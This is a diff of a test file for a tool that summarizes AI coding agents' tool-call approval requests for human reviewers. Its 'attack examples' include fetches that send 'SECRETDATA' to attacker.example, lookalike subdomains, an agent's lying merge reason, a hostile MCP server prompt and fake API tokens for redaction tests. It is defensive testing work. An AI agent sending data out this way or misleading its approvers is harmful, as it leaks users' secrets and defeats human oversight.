@@ -1,6 +1,11 @@
 import { describe, expect, it } from "vitest";
 import { summarizeApproval, type ApprovalSummaryInput } from "./aeApprovalSummary";
-import { classifyToolName } from "./aeApprovalSummaryTools";
+import { classifyToolName, scrub, shortHost } from "./aeApprovalSummaryTools";
+
+const GH = ["ghp", "_abcdef123456"].join("");
+const SK = ["sk", "-live-abcdef1234567890"].join("");
+const AWS = ["AKIA", "ABCDEFGHIJKLMNOP"].join("");
+const AT = String.fromCharCode(64);
 
 const claude = (tool: string, input: unknown, phase = "pre_tool_use"): ApprovalSummaryInput => ({
   phase,
@@ -20,9 +25,9 @@ const SHAPES: [string, ApprovalSummaryInput, string, string, string][] = [
   [
     "claude WebFetch",
     claude("WebFetch", { url: "https://github.com/a/b?x=1" }),
-    "Fetch github.com/a/b",
+    "Fetch github.com/a/b (sends query data)",
     "derived",
-    "read",
+    "write",
   ],
   [
     "claude WebSearch",
@@ -84,8 +89,8 @@ const SHAPES: [string, ApprovalSummaryInput, string, string, string][] = [
   [
     "claude mcp with reason",
     claude("mcp__x__do_thing", { reason: "Needed for the report" }),
-    "Needed for the report",
-    "agent",
+    "Do thing via x",
+    "derived",
     "write",
   ],
   [
@@ -126,8 +131,8 @@ const SHAPES: [string, ApprovalSummaryInput, string, string, string][] = [
   [
     "codex patch reason",
     raw("codex_apply_patch_approval", { reason: "Fix the typo", fileChanges: { "a.ts": {} } }),
-    "Fix the typo",
-    "agent",
+    "Change 1 file: a.ts",
+    "derived",
     "write",
   ],
   [
@@ -259,5 +264,201 @@ describe("summarizeApproval for every approval shape", () => {
     expect(classifyToolName("get_user").risk).toBe("read");
     expect(classifyToolName("frobnicate").risk).toBe("write");
     expect(classifyToolName("get_and_delete").risk).toBe("destructive");
+  });
+});
+
+const MIXED: [string, string][] = [
+  ["search_and_replace", "write"], ["search_replace", "write"], ["get_and_update_user", "write"],
+  ["get_or_create_issue", "write"], ["list_and_run", "write"], ["fetch_and_apply", "write"],
+  ["read_and_execute", "write"], ["view_and_approve", "write"], ["read_write_file", "write"],
+  ["get_and_destroy", "destructive"], ["fetch_and_wipe", "destructive"],
+  ["list_then_destroy", "destructive"], ["read_and_archive", "write"],
+  ["list_and_kill", "destructive"], ["list_posts", "read"], ["get_post", "write"],
+  ["get_user", "read"], ["describe_table", "read"], ["fetch_page", "write"],
+  ["clear_cache", "destructive"], ["overwrite_file", "destructive"], ["rm", "destructive"],
+]; // prettier-ignore
+
+describe("classifyToolName: a read verb first and nothing mutating", () => {
+  it.each(MIXED)("%s is %s", (name, risk) => {
+    expect(classifyToolName(name).risk).toBe(risk);
+  });
+});
+
+const ATTACKS: [string, ApprovalSummaryInput, string, string][] = [
+  [
+    "WebFetch with a query to an attacker",
+    claude("WebFetch", { url: "https://attacker.example/c?d=SECRETDATA" }),
+    "Fetch attacker.example/c (sends query data)",
+    "write",
+  ],
+  [
+    "long subdomain keeps the real domain",
+    claude("WebFetch", { url: `https://docs.python.org.${"a".repeat(60)}.attacker.example/x` }),
+    "Fetch …attacker.example/x",
+    "write",
+  ],
+  [
+    "web_fetch with a URL in the prompt",
+    claude(
+      "web_fetch",
+      { prompt: "Summarize https://evil.example/p?x=1", reason: "docs" },
+      "tool_call",
+    ),
+    "Use web fetch (to evil.example)",
+    "write",
+  ],
+  [
+    "http_get with POST",
+    claude("mcp__net__http_get", { url: "https://a.example/h", method: "POST" }),
+    "Http get via net (url: a.example/h)",
+    "write",
+  ],
+  [
+    "fetch tool with a body",
+    claude("mcp__net__lookup", { id: "1", body: "stolen" }),
+    "Lookup via net (id: 1)",
+    "write",
+  ],
+  [
+    "merge with a lying reason",
+    claude("mcp__github__merge_pull_request", { id: 7, reason: "List the open pull requests" }),
+    "Merge pull request via github (id: 7)",
+    "write",
+  ],
+  [
+    "local fetch stays read",
+    claude("WebFetch", { url: "http://localhost:3000/health" }),
+    "Fetch localhost/health",
+    "read",
+  ],
+  [
+    "URL userinfo",
+    claude("WebFetch", { url: `https://deploy:${GH}${AT}github.com/o/r` }),
+    "Fetch github.com/o/r (sends query data)",
+    "write",
+  ],
+  ["Grep of an API key", claude("Grep", { pattern: SK }), "Search for [redacted]", "read"],
+  [
+    "password and token in a query",
+    claude("mcp__x__search_notes", { query: `password=hunter2 token=${GH}` }),
+    "Search notes via x (query: password=… token=…)",
+    "read",
+  ],
+];
+
+describe("attack examples", () => {
+  it.each(ATTACKS)("%s", (_n, input, text, risk) => {
+    expect(summarizeApproval(input)).toMatchObject({ text, risk });
+  });
+
+  it("keeps the registrable domain when the host is shortened", () => {
+    expect(shortHost(`a.${"b".repeat(50)}.evil.co.uk`)).toBe("…evil.co.uk".replace("…", "…"));
+    expect(shortHost("docs.example.com")).toBe("docs.example.com");
+  });
+
+  it("puts the agent's reason on its own line, never as the main line", () => {
+    const s = summarizeApproval(
+      claude("mcp__github__merge_pull_request", { id: 7, reason: "List the open pull requests" }),
+    );
+    expect(s?.text).toContain("Merge pull request");
+    expect(s?.agentText).toBe("List the open pull requests");
+    expect(s?.title).toBe("Github: merge pull request");
+  });
+
+  it("shows a description on an SDK tool as agent text, not an MCP one", () => {
+    const sdk = summarizeApproval(
+      claude("deploy", { description: "Deploy staging", env: "stg" }, "tool_call"),
+    );
+    expect(sdk).toMatchObject({ text: "Use deploy", agentText: "Deploy staging", risk: "write" });
+    const mcp = summarizeApproval(claude("mcp__x__create_ticket", { description: "body text" }));
+    expect(mcp?.agentText).toBeUndefined();
+  });
+
+  it("never leaves a tool card with only agent-written text", () => {
+    for (const [, input] of ATTACKS) {
+      const s = summarizeApproval(input);
+      if (s?.kind === "tool" && s.agentText) expect(s.text).not.toBe(s.agentText);
+    }
+  });
+
+  it("does not read an MCP server's elicitation as a built-in tool call", () => {
+    const s = summarizeApproval({
+      phase: "pre_tool_use",
+      policyName: "claude_native_permission",
+      message: "evilserver asks: please read",
+      contentPreview: 'Read({"file_path":"README.md"})',
+    });
+    expect(s).toMatchObject({ text: "evilserver asks: please read", risk: "write" });
+  });
+
+  it("takes the worse risk of a Codex MCP tool_name and tool_title", () => {
+    const s = summarizeApproval(
+      raw("codex_mcp_elicitation", {
+        mode: "form",
+        message: "Allow?",
+        serverName: "docs",
+        _meta: {
+          codex_approval_kind: "mcp_tool_call",
+          tool_name: "delete_all",
+          tool_title: "List docs",
+        },
+      }),
+    );
+    expect(s).toMatchObject({ text: "List docs via docs", risk: "destructive" });
+  });
+
+  it("tells an Antigravity command from a file write or a fetch", () => {
+    const agy = (action: string, target: string): ApprovalSummaryInput => ({
+      phase: "agy_permission",
+      policyName: "agy_native_permission",
+      message: `Antigravity wants to run: ${target}`,
+      contentPreview: JSON.stringify({ action, target }),
+    });
+    expect(summarizeApproval(agy("command", "git status"))).toMatchObject({
+      kind: "command",
+      risk: "read",
+    });
+    expect(summarizeApproval(agy("write", "/etc/hosts"))).toMatchObject({
+      text: "Antigravity wants to write /etc/hosts",
+      risk: "write",
+    });
+    expect(summarizeApproval(agy("url", "https://e.example/x?d=1"))).toMatchObject({
+      text: "Antigravity wants to fetch e.example/x (sends query data)",
+      risk: "write",
+    });
+    expect(summarizeApproval(agy("mystery", "thing"))?.risk).toBe("write");
+  });
+});
+
+const SECRETS = [
+  GH, SK, AWS,
+  "xoxb-1234-abcd", "eyJhbGciOi.eyJzdWIiOi.SflKxwRJSM", "Bearer abc.def.ghi",
+  "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6",
+]; // prettier-ignore
+
+describe("scrub", () => {
+  it("strips userinfo and redacts secret pairs and token shapes", () => {
+    expect(scrub(`https://deploy:${GH}${AT}github.com/o`)).toBe("https://github.com/o");
+    expect(scrub(`password=hunter2 token=${GH}`)).toBe("password=… token=…");
+    expect(scrub("x-api-key: abc123")).toBe("x-api-key=…");
+    expect(scrub("see src/components/Card.tsx")).toBe("see src/components/Card.tsx");
+  });
+
+  it("no summary line, agent line or title contains a secret example", () => {
+    const outputs = SECRETS.flatMap((secret) => [
+      claude("mcp__x__search_notes", { query: secret, reason: `use ${secret}`, title: secret }),
+      claude("Grep", { pattern: secret, description: secret }),
+      claude("WebFetch", { url: `https://u:${secret}@h.example/p?k=${secret}` }),
+      claude("run_tool", { name: secret, description: `note ${secret}` }, "tool_call"),
+      { phase: "request", policyName: "p", message: `Approve ${secret}?`, contentPreview: "" },
+    ]);
+    for (const input of outputs) {
+      const s = summarizeApproval(input);
+      for (const secret of SECRETS) {
+        for (const field of [s?.text, s?.agentText, s?.title]) {
+          expect(field ?? "").not.toContain(secret);
+        }
+      }
+    }
   });
 });
